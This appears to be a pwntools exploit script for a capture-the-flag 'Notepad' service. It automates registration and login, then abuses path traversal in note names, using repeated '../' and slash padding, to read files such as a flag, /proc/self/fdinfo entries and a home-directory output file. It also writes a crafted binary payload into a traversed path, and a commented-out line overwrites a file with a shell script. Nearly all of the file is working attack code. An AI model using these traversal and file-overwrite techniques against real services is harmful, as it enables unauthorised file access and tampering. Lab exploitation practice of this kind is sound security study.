from math import pi
from pwn import *
import random
import string


def gen_rand_str(length: int):
    return "".join(random.choice(string.ascii_letters) for i in range(length))


def read_menu(r):
    log.debug("Reading menu")
    # for i in range(7):
    #     r.readline().decode().strip()
    r.recvuntil(b"> ").decode()


def login(r, username: str, password: str):
    read_menu(r)
    log.debug("Logging in")
    r.sendline(b"1")
    r.recvuntil(b"Username: ")
    r.sendline(username.encode())
    r.recvuntil(b"Password: ")
    r.sendline(password.encode())
    log.info(f"{r.recvline().decode().strip()} {username} {password}")


def register(r, username: str, password: str):
    read_menu(r)
    log.debug("Registering")
    r.sendline(b"2")
    r.recvuntil(b"Username: ")
    r.sendline(username.encode())
    r.recvuntil(b"Password: ")
    r.sendline(password.encode())
    log.info(f"{r.recvline().decode().strip()} {username} {password}")


def new_note(r, name: str, content: str):
    read_menu(r)
    log.debug("Creating note")
    r.sendline(b"3")
    r.recvuntil(b"Note Name: ")
    assert len(name) <= 128, f"Name length {len(name)} > 128"
    r.send(name.encode())
    r.recvuntil(b"Content Length: ")
    assert len(content) <= 1024, f"Content length {len(content)} > 1024"
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.send(content.encode())
    log.info(f"{r.recvline().decode().strip()} {name} {len(content)=}")


def edit_note(r, name: str, offset: int, content: bytes):
    if len(name) > 128:
        log.warning(f"Name length {len(name)} >= 128")
        return
    read_menu(r)
    log.debug("Editing note")
    r.sendline(b"4")
    r.recvuntil(b"Note Name: ")
    assert len(name) <= 128, f"Name length {len(name)} > 128"
    r.send(name.encode())
    r.recvuntil(b"Offset: ")
    r.sendline(str(offset).encode())
    r.recvuntil(b"Content Length: ")
    assert len(content) <= 1024, f"Content length {len(content)} > 1024"
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.send(content)
    ret = r.recvline().decode().strip()
    log.info(f"72: `{ret}` {name} {offset=} {len(content)=}")


def show_note(r, name: str, offset: int) -> tuple[str, int]:
    if len(name) > 128:
        log.warning(f"Name length {len(name)} > 128")
        return "", 0
    read_menu(r)
    log.debug("Showing note")
    r.sendline(b"5")
    r.recvuntil(b"Note Name: ")
    r.send(name.encode())
    r.recvuntil(b"Offset: ")
    r.sendline(str(offset).encode())
    org = r.recvline()
    ret = org.decode().strip()
    if ret == "Read note failed.":
        # log.info(f"`{ret}` {name} {offset=}")
        return ret, 0
    if ret == "Couldn't open the file.":
        # log.info(f"`{ret}` {name} {offset=}")
        return ret, 0
    if "+==========      Notepad       ==========+" in ret:
        content = ret[: ret.find("+==========      Notepad       ==========+")]
        length = len(content)
        return content, length
    log.debug(f"`{ret}` {name} {offset=}")
    return ret + "\n", len(ret) + 1


def stage1(r):
    try:
        user = gen_rand_str(8)
        password = gen_rand_str(8)
        log.info(f"Username: {user}")
        log.info(f"Password: {password}")
        register(r, user, password)
        login(r, user, password)
        fnames = [
            "flag_user",
            "/flag_user",
            "//flag_user",
        ]
        for i in range(30, 40):
            for fname in fnames:
                path = "../" * i + fname
                if len(path) > 128:
                    log.warning(f"Length: {len(path)}: {path}")
                    break
                log.debug(f"Length: {len(path)}: {path}")
                show_note(r, path, 0)
    except EOFError:
        log.error(r.recvline().decode())
        r.close()
    except Exception as e:
        print(e)
        r.close()


def show_file(r, name: str):
    if len(name) > 128:
        log.warning(f"Name length {len(name)} > 128")
        return
    rname = "/" * (107 - len(name)) + name
    # log.info(f"Reading {rname}")
    off = 0
    content = ""
    while True:
        log.info(f"Reading {name} {off=}")
        block, length = show_note(r, rname, off)
        if length == 0:
            log.info(block)
            log.info("Done")
            break
        assert length == len(block), f"{length=} {len(block)=}"
        off += length
        content += block
        log.info(block)
    if content:
        print(content.strip())


def stage2(r):
    try:
        user = gen_rand_str(8)
        password = gen_rand_str(8)
        register(r, user, password)
        login(r, user, password)
        # show_file(r, "../../../flag_user")
        # show_file(r, "../../../proc/self/fdinfo/6")
        fname = "../../../proc/self/fdinfo/0"
        show_file(r, fname)
        msg = p32(0x8787) + b"1" * 32 + b"A" * 128
        print(msg)
        edit_note(
            r,
            (107 - len(fname)) * "/" + fname,
            0,
            msg,
        )

    except EOFError:
        log.error(r.recvline().decode())
        r.close()


def test(r):
    try:
        user = gen_rand_str(8)
        password = gen_rand_str(8)
        register(r, user, password)
        login(r, user, password)
        file = "../../../home/notepad/output"
        show_file(r, file)
        rfile = "/" * (107 - len(file)) + file
        log.info(show_note(r, rfile, 0))
        # edit_note(r, rfile, 0, b"#!/bin/sh\necho 1")
        # log.info(show_note(r, rfile, 0))
    except EOFError:
        log.error(r.recvline().decode())
        r.close()


if __name__ == "__main__":
    # log.setLevel("DEBUG")
    with open("port", "r") as f:
        port = int(f.read())
    r = remote("10.113.184.121", port)
    # stage1(r)
    # stage2(r)
    test(r)
